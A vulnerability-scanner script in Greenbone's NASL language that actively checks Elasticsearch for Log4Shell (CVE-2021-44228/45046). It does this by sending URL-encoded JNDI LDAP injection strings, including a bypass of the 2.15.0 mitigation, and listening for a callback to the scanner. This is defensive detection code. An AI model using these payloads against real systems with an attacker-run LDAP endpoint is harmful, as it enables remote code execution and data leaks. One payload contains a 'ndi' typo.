# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:elastic:elasticsearch";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148545");
  script_version("2022-07-29T08:00:40+0000");
  script_tag(name:"last_modification", value:"2022-07-29 08:00:40 +0000 (Fri, 29 Jul 2022)");
  script_tag(name:"creation_date", value:"2022-07-29 06:38:03 +0000 (Fri, 29 Jul 2022)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-12-14 01:15:00 +0000 (Tue, 14 Dec 2021)");

  script_cve_id("CVE-2021-44228", "CVE-2021-45046");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Elastic Elasticsearch Multiple Log4j Vulnerabilities (ESA-2021-31, Log4Shell) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_elastic_elasticsearch_detect_http.nasl");
  script_mandatory_keys("elastic/elasticsearch/http/detected");
  script_require_ports("Services/www", 9200);

  script_tag(name:"summary", value:"Elastic Elasticsearch is prone to multiple vulnerabilities in
  the Apache Log4j library.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.

  Note: For a successful detection of this flaw the target host needs to be able to reach the
  scanner host on a TCP port randomly generated during the runtime of the VT (currently in the range
  of 10000-32000).");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  CVE-2021-44228: Apache Log4j2 JNDI features used in configuration, log messages, and parameters do
  not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can
  control log messages or log message parameters can execute arbitrary code loaded from LDAP servers
  when message lookup substitution is enabled. This vulnerability is dubbed 'Log4Shell'.

  CVE-2021-45046: Denial of Service (DoS) and a possible remote code execution (RCE) in certain
  non-default configurations.");

  script_tag(name:"impact", value:"Please note the following vendor statement on the impact:

  Elasticsearch 6 and 7 are not susceptible to remote code execution with this vulnerability due to
  our use of the Java Security Manager. Elasticsearch running on JDK8 or below is susceptible to an
  information leak via DNS.

  Elasticsearch 5 is susceptible to both remote code execution and an information leak via DNS.

  To avoid unknown risks it is still recommended to apply the update provided by the vendor.");

  script_tag(name:"affected", value:"Elastic Elasticsearch version 5.x through 7.x.");

  script_tag(name:"solution", value:"Update to version 6.8.21, 7.16.1 or later.");

  script_xref(name:"URL", value:"https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476");
  script_xref(name:"URL", value:"https://discuss.elastic.co/t/elasticsearch-5-0-0-5-6-10-and-6-0-0-6-3-2-log4j-cve-2021-44228-cve-2021-45046-remediation/292054");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-jfh8-c2jp-5v3q");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/10/1");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day/");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/");
  script_xref(name:"URL", value:"https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("pcap_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

ownhostname = this_host_name();
ownip = this_host();
targetip = get_host_ip();
src_filter = pcap_src_ip_filter_from_hostnames();
# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
# by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
# have false positives due to race conditions (target is sending back a response to a request of
# another VT for which the scanner had chosen the same source port).
rnd_port = rand_int_range(min: 10000, max: 32000);
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string("tcp and dst port ", rnd_port, " and ", src_filter, " and ", dst_filter);

payloads = make_list(
  # Original PoC for CVE-2021-44228
  "$%7Bjndi:ldap://" + ownip + ":" + rnd_port + "%7D",
  "$%7Bjndi:ldap://" + ownhostname + ":" + rnd_port + "%7D",
  # Bypass of the "allowedLdapHost" mitigation in Log4j 2.15.0:
  # https://twitter.com/marcioalm/status/1471740771581652995
  # Some reports on the net says that a valid hostname needs to be given after "#" but we check the
  # IP as well just to be sure...
  "$%7Bjndi:ldap://127.0.0.1#" + ownip + ":" + rnd_port + "%7D",
  "$%7Bjndi:ldap://127.0.0.1#" + ownhostname + ":" + rnd_port + "%7D",
  # Also try with the localhost variant just to be sure...
  "$%7Bndi:ldap://localhost#" + ownip + ":" + rnd_port + "%7D",
  "$%7Bjndi:ldap://localhost#" + ownhostname + ":" + rnd_port + "%7D"
);

headers = make_array("Content-Type", "application/json");

data = "{";

foreach payload (payloads) {
  url = "/_search?a=" + payload;

  # nb: Always keep http_get() before open_sock_tcp() as the first could fork with multiple vhosts
  # and the child's would share the same socket causing race conditions and similar.
  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  # We need to convert it to a GET request
  req = str_replace(string: req, find: "POST ", replace: "GET ", count: 1);

  if (!soc = open_sock_tcp(port))
    continue;

  res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);
  close(soc);

  if (res) {

    info["HTTP Method"] = "GET";
    info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
    info["HTTP body"] = data;
    info['HTTP "Content-Type" header'] = headers["Content-Type"];

    # nb: We need to call the correct get_ip_*element() function below depending on the IP version
    # of the received IP packet.
    ip_vers_hex = hexstr(res[0]);
    if (ip_vers_hex[0] == 4) {
      src_ip = get_ip_element(ip: res, element: "ip_src");
      dst_ip = get_ip_element(ip: res, element: "ip_dst");
    } else if (ip_vers_hex[0] == 6) {
      src_ip = get_ipv6_element(ipv6: res, element: "ip6_src");
      dst_ip = get_ipv6_element(ipv6: res, element: "ip6_dst");
    }

    if (!src_ip)
      src_ip = "N/A";

    if (!dst_ip)
      dst_ip = "N/A";

    report  = 'By doing a HTTP request with the following data (excerpt):\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
    report += "Destination IP:   " + dst_ip + ' (receiving IP on scanner host side)\n';
    report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
    report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
    security_message(port: port, data: report);
    exit(0);
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host.
exit(0);
